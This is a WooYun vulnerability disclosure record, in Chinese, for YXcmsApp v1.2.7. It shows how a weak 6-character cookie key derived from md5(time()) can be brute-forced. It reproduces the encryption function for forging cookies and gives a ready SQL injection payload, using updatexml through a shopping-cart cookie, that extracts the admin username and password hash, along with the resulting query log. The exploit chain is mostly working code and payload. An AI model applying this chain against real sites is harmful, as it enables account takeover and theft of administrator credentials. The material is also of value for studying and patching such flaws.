{"id": 40811, "wybug_id": "wooyun-2015-090730", "wybug_title": "YXcmsApp v1.2.7 暴力sql注入。", "wybug_corp": "yxcms.net", "wybug_author": "roker", "wybug_date": "2015-01-15 12:29", "wybug_open_date": "2015-04-02 10:23", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-20：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向公众公开  简要描述： rt 详细说明：  YXcmsApp 的cookie的加密用的都是dz的那个函数，看看密钥是怎么来的protected/apps/install/controller/indexController.php\n$this->randomcode= substr(md5(time()), 0, 6);\n唔。才6位，那么就很好破解了，(poc见测试代码)\n\n注册用户，抓包获取cookie yx_aut的值，利用poc得到key后，我们就能根据他的加密函数控制cookie了。\n\n\nfunction cp_encode($data,$key='',$expire = 0){\t$string=serialize($data);\t$ckey_length = 4;\t$key = md5($key);\t$keya = md5(substr($key, 0, 16));\t$keyb = md5(substr($key, 16, 16));\t$keyc = substr(md5(microtime()), -$ckey_length);\t$cryptkey = $keya.md5($keya.$keyc);\t$key_length = strlen($cryptkey);\t\t$string =  sprintf('%010d', $expire ? $expire + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\t$string_length = strlen($string);\t$result = '';\t$box = range(0, 255);\t$rndkey = array();\tfor($i = 0; $i <= 255; $i++) \t{\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\t}\tfor($j = $i = 0; $i < 256; $i++) \t{\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\t\t$tmp = $box[$i];\t\t$box[$i] = $box[$j];\t\t$box[$j] = $tmp;\t}\tfor($a = $j = $i = 0; $i < $string_length; $i++) \t{\t\t$a = ($a + 1) % 256;\t\t$j = ($j + $box[$a]) % 256;\t\t$tmp = $box[$a];\t\t$box[$a] = $box[$j];\t\t$box[$j] = $tmp;\t\t$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\t}\treturn $keyc.str_replace('=', '', base64_encode($result));\t\t}echo cp_encode(\"xxx\",$key);\n下面就是找一个注入的地方咯~/protected/apps/member/controller/orderController.php\npublic function orderadd()      {        $list=get_cookie($this->auth['id'].'shopcar');        if(!empty($list)){          $memberconfig=appConfig('member');          $data['ordersubject']=empty($list[1])?in($list[0]['name']):'合并付款';          $data['ordernum']=date(\"YmdHis\").rand(0,100);          $data['account']=$this->auth['account'];          $data['freighttype']=in($_POST['type']);          $data['freightpayment']=$memberconfig['PAYMENT'];          $data['freight']=$memberconfig['MAIL_TYPE'][in($_POST['type'])][1];;//运费          $data['receivename']=in($_POST['uname']);          $data['receivephone']=in($_POST['phone']);          $data['receivemobile']=in($_POST['mobile']);          $data['receiveaddress']=in($_POST['address']);          $data['receivezip']=in($_POST['zip']);          $data['total']=0;          $data['ordertime']=time();          $data['state']=0;          $data['mess']=in($_POST['mess']);                    foreach ($list as $value) {             $value['ordernum']=$data['ordernum'];             $id=model('orderDetail')->insert($value);             if(!$id) $this->error('订单物品信息有误~');             $data['total']+=floatval($value['price'])*intval($value['num']);          }\n可以看到 将cookie的值传入了$list。然后 带入了insert。insert对字段做了过滤，对键的值却没有。 赋值给$list为一个数组。键的值为注入语句即可造成注入 。\n$a=array(array(\"code`) value('1' or 1 = updatexml(1,concat(0x5c,(SELECT concat(username,0x23,password) FROM yx_admin LIMIT 1)),1))#\"=>\"1\",\"name\"=>\"1\",\"pric\"=>\"1\",\"num\"=>\"1\"));echo cp_encode($a,\"00e29y\");\n在 index.php?r=member/order/orderadd修改cookie yx_1shopca，即可注入出数据。\n173 Query\tINSERT INTO yx_order_detail  (`code`) value('1' or 1 = updatexml(1,concat(0x5c,(SELECT concat(username,0x23,password) FROM yx_admin LIMIT 1)),1))#`,`name`,`pric`,`num`,`ordernum`) VALUES ('1','1','1','1','2015010906301335')\n\n\n   漏洞证明：  \n\n   修复方案：  过滤。。   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-02 10:23 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}